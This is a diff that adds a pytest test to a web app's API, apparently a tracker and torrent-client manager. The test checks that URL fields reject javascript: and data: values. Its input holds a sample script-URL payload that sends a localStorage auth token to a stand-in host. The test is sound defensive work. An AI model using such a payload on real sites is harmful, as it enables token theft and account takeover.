@@ -20,3 +20,16 @@ def test_a_change_from_another_site_is_refused(client):
     assert client.post("/api/reviews/1/approve").status_code == 404
     # Le letture non si toccano.
     assert client.get("/api/disks", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 200
+
+
+def test_urls_that_end_up_in_links_must_be_http(client):
+    evil = "javascript:fetch('//x/'+localStorage.nazgarr_token)//"
+    tracker = {"label": "t", "adapter_type": "unit3d", "base_url": evil, "api_token": "x"}
+    assert client.post("/api/trackers", json=tracker).status_code == 422
+    ok = client.post("/api/trackers", json={**tracker, "base_url": "https://t.example"})
+    assert ok.status_code == 201
+    tracker_id = ok.json()["id"]
+    assert client.patch(f"/api/trackers/{tracker_id}", json={"base_url": "data:text/html,x"}).status_code == 422
+    assert client.patch(f"/api/trackers/{tracker_id}", json={"announce_url": evil}).status_code == 422
+    client_body = {"label": "q", "adapter_type": "qbittorrent", "base_url": evil}
+    assert client.post("/api/torrent-clients", json=client_body).status_code == 422
